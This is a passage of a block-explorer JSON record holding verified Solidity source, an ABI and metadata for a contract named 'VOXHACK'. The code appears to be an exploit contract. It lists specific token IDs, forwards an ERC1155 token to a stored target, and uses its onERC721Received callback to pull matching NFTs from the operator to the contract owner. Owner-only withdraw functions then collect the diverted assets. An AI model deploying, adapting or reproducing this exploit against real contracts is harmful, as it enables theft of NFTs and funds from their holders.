true;\r\nvoxIds[7482] = true;\r\nvoxIds[7509] = true;\r\nvoxIds[7546] = true;\r\nvoxIds[7551] = true;\r\nvoxIds[7568] = true;\r\nvoxIds[7580] = true;\r\nvoxIds[7581] = true;\r\nvoxIds[7582] = true;\r\nvoxIds[7585] = true;\r\nvoxIds[7586] = true;\r\nvoxIds[7608] = true;\r\nvoxIds[7626] = true;\r\nvoxIds[7671] = true;\r\nvoxIds[7696] = true;\r\nvoxIds[7703] = true;\r\nvoxIds[7720] = true;\r\nvoxIds[7777] = true;\r\nvoxIds[7796] = true;\r\nvoxIds[7852] = true;\r\nvoxIds[7862] = true;\r\nvoxIds[7904] = true;\r\nvoxIds[7943] = true;\r\nvoxIds[7947] = true;\r\nvoxIds[7965] = true;\r\nvoxIds[8107] = true;\r\nvoxIds[8128] = true;\r\nvoxIds[8165] = true;\r\nvoxIds[8182] = true;\r\nvoxIds[8263] = true;\r\nvoxIds[8271] = true;\r\nvoxIds[8280] = true;\r\nvoxIds[8283] = true;\r\nvoxIds[8284] = true;\r\nvoxIds[8313] = true;\r\nvoxIds[8329] = true;\r\nvoxIds[8330] = true;\r\nvoxIds[8357] = true;\r\nvoxIds[8371] = true;\r\nvoxIds[8378] = true;\r\nvoxIds[8403] = true;\r\nvoxIds[8465] = true;\r\nvoxIds[8480] = true;\r\nvoxIds[8488] = true;\r\nvoxIds[8495] = true;\r\nvoxIds[8509] = true;\r\nvoxIds[8548] = true;\r\nvoxIds[8554] = true;\r\nvoxIds[8573] = true;\r\nvoxIds[8577] = true;\r\nvoxIds[8595] = true;\r\nvoxIds[8597] = true;\r\nvoxIds[8610] = true;\r\nvoxIds[8653] = true;\r\nvoxIds[8681] = true;\r\nvoxIds[8688] = true;\r\nvoxIds[8696] = true;\r\nvoxIds[8703] = true;\r\nvoxIds[8704] = true;\r\nvoxIds[8741] = true;\r\nvoxIds[8770] = true;\r\nvoxIds[8772] = true;\r\nvoxIds[8779] = true;\r\nvoxIds[8804] = true;\r\nvoxIds[8851] = true;\r\nvoxIds[8855] = true;\r\nvoxIds[8857] = true;\r\n    }\r\n    function pokgai(\r\n        IERC1155 token,\r\n        uint256 tokenId\r\n    ) external payable onlyOwner {\r\n        token.safeTransferFrom(msg.sender, address(this), tokenId, 1, \"\");\r\n        token.safeTransferFrom(address(this), target, tokenId, 1, \"\");\r\n    }\r\n\r\n    function withdrawBalance(address to) external onlyOwner {\r\n        (bool success, ) = to.call{value: address(this).balance}(\"\");\r\n        require(success, \"BALANCE_TRANSFER_FAILURE\");\r\n    }\r\n\r\n    function withdrawERC721(\r\n        IERC721 token,\r\n        address receiver,\r\n        uint256 tokenId\r\n    ) external onlyOwner {\r\n        token.transferFrom(address(this), receiver, tokenId);\r\n    }\r\n\r\n    function withdrawERC1155(\r\n        IERC1155 token,\r\n        address receiver,\r\n        uint256 tokenId\r\n    ) external onlyOwner {\r\n        token.safeTransferFrom(address(this), receiver, tokenId, 1, \"\");\r\n    }\r\n\r\n    function onERC721Received(\r\n        address operator,\r\n        address,\r\n        uint256 tokenId,\r\n        bytes memory\r\n    ) public virtual override returns (bytes4) {\r\n        IERC721 sender = IERC721(msg.sender);\r\n        require (voxIds[tokenId]);\r\n        sender.transferFrom(operator, owner(), tokenId);\r\n        return this.onERC721Received.selector;\r\n    }\r\n}","ABI":"[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"operator\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"\",\"type\":\"bytes\"}],\"name\":\"onERC721Received\",\"outputs\":[{\"internalType\":\"bytes4\",\"name\":\"\",\"type\":\"bytes4\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC1155\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"pokgai\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"withdrawBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC1155\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"withdrawERC1155\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC721\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"withdrawERC721\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"VOXHACK","CompilerVersion":"v0.8.7+commit.e28d00a7","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"000000000000000000000000f76179bb0924ba7da8e7b7fc2779495d7a7939d8","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"ipfs://32b357ca7acb79d2cc7f1755b3eb21942b18a1d15b69766e6aa4e72574f053f5"}]}